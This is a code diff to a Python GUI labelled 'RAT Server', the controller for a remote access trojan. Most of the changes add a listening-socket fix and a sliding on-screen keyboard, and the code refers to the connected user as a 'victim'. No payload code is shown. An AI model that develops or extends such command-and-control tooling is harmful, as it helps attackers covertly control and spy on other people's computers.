@@ -188,10 +188,14 @@ def send_command_to_client(command_line, client_socket, text_box):
 def server(parent_frame, go_back_callback=None):
     clear_frame(parent_frame)
 
-    # Сокет и запуск сервера
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(('0.0.0.0', port))
-    server_socket.listen(1)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Чтобы избежать WinError 10048
+    try:
+        server_socket.bind(('0.0.0.0', port))
+        server_socket.listen(1)
+    except OSError as e:
+        print(f"Ошибка при привязке сокета: {e}")
+        return  # Можно вывести это в UI
 
     # Основной контейнер с горизонтальным разделением (левая и правая части)
     main_frame = ctk.CTkFrame(parent_frame, fg_color="#0f0f0f")
@@ -209,9 +213,22 @@ def server(parent_frame, go_back_callback=None):
     top_right_frame = ctk.CTkFrame(right_frame)
     top_right_frame.pack(side="top", fill="both", expand=True)
 
-    # Нижняя часть правой панели (виртуальная клавиатура)
-    bottom_right_frame = ctk.CTkFrame(right_frame, height=200)
-    bottom_right_frame.pack(side="bottom", fill="x")
+    bottom_frame = ctk.CTkFrame(main_frame)
+    # bottom_frame.pack(fill="x", pady=10)
+
+    close_keyboard_button = ctk.CTkButton(
+        bottom_frame,
+        text="X",
+        font=("Arial", 25),
+        command=lambda: hide_keyboard(),
+        fg_color="#3b3b3b",
+        border_color="#8d33ff",
+        hover_color="#444444",
+        width=50,
+        height=50,
+        border_width=2
+    )
+    close_keyboard_button.place(relx=1.0, rely=0.0, anchor="ne", x=-10, y=10)
 
     # === Левая панель ===
     title = ctk.CTkLabel(left_frame, text="RAT Server 💀", font=ctk.CTkFont(family="Consolas", size=18, weight="bold"), text_color="#8a2be2")
@@ -234,16 +251,13 @@ def server(parent_frame, go_back_callback=None):
     text_box = ctk.CTkTextbox(top_right_frame, fg_color="#0f0f0f", text_color="#39ff14")
     text_box.pack(fill="both", expand=True, padx=5, pady=5)
 
-    # === Правая нижняя панель (клавиатура) ===
-    keyboard = NormalKeyboard(bottom_right_frame, command_line, key_width=30, key_height=20)
-
     # === Кнопка для старта сервера ===
     def run_server():
         thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label))
         thread.daemon = True
         thread.start()
 
-    start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=run_server)
+    start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=lambda: run_server())
     start_server_btn.pack(pady=10)
 
     back_btn = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback)
@@ -256,12 +270,98 @@ def server(parent_frame, go_back_callback=None):
     status_label = ctk.CTkLabel(left_frame, text="🔴 Not connected", text_color="red")
     status_label.pack(pady=5)
 
-    username_label = ctk.CTkLabel(left_frame, text=f"Username victim: {active_user[0]}")
-    username_label.pack(pady=5)
+    # username_label = ctk.CTkLabel(left_frame, text=f"Username victim: {active_user[0]}")
+    # username_label.pack(pady=5)
+
+    username_label = None
 
     # === Логирование в text_box ===
     safe_textbox_insert(text_box, f"listen on the port: {port}...\n")
     text_box.configure(state="disabled")
     text_box.pack(pady=10, fill="both", expand=True, padx=20)
 
-    run_server()
+    auto_thread = None  # Объявим переменную, но не запускаем поток
+    
+    # Переменная для хранения активного поля
+    active_entry = None
+    def set_target_entry(entry, name):
+        nonlocal active_entry
+        active_entry = entry
+        keyboard.target_entry = entry
+        #print(f"[DEBUG] Активное поле ввода: {name}")
+
+    # Виртуальная клавиатура в нижнем фрейме
+    keyboard = None  # Клавиатура будет создана позже
+
+
+    # Привязка клавиатуры к полям ввода
+    command_line.bind("<FocusIn>", lambda e: [set_target_entry(command_line, "Target (IP/Domain)"), show_keyboard()])
+
+    keyboard_visible = False
+
+    def slide_keyboard(target_y, step=10):
+        parent_frame.update()
+        parent_frame_width = parent_frame.winfo_width()
+        x_pos = (parent_frame_width - keyboard_width) // 2
+
+        current_y = bottom_frame.winfo_y()
+        if abs(current_y - target_y) < step:
+            bottom_frame.place_configure(x=x_pos, y=target_y, width=keyboard_width, height=keyboard_height)
+            return
+        direction = 1 if target_y > current_y else -1
+        next_y = current_y + direction * step
+        bottom_frame.place_configure(x=x_pos, y=next_y, width=keyboard_width, height=keyboard_height)
+        parent_frame.after(10, lambda: slide_keyboard(target_y, step))
+
+
+    def show_keyboard():
+        nonlocal keyboard_visible, keyboard
+        if keyboard_visible:
+            return
+
+        if keyboard is None:
+            keyboard = NormalKeyboard(bottom_frame, command_line)
+            # Привязка только при первом создании:
+            command_line.bind("<FocusIn>", lambda e: [set_target_entry(command_line, "Target (IP/Domain)"), show_keyboard()])
+
+        keyboard_visible = True
+        slide_keyboard(target_y=parent_frame.winfo_height() - 300)
+
+
+    def hide_keyboard():
+        nonlocal keyboard_visible
+        if not keyboard_visible:
+            return
+        keyboard_visible = False
+        slide_keyboard(target_y=parent_frame.winfo_height())
+
+    def toggle_keyboard():
+        if keyboard_visible:
+            hide_keyboard()
+        else:
+            show_keyboard()
+
+    toggle_button = ctk.CTkButton(
+        left_frame,
+        text="⌨ Клавиатура",
+        command=lambda: toggle_keyboard(),
+        fg_color="#3b3b3b",
+        border_color="#8d33ff",
+        hover_color="#444444",
+        border_width=2
+    )
+    toggle_button.pack(side="left", padx=10)
+
+
+    # Изначально клавиатура скрыта (сдвигаем за пределы контейнера)
+    keyboard_width = 750
+    keyboard_height = 300
+
+    def place_keyboard_at(y_pos):
+        parent_frame.update()
+        parent_frame_width = parent_frame.winfo_width()
+        x_pos = (parent_frame_width - keyboard_width) // 2
+        bottom_frame.place(in_=parent_frame, x=x_pos, y=y_pos, width=keyboard_width, height=keyboard_height)
+
+    # Изначально скрываем клавиатуру
+    parent_frame.after(100, lambda: place_keyboard_at(parent_frame.winfo_height()))
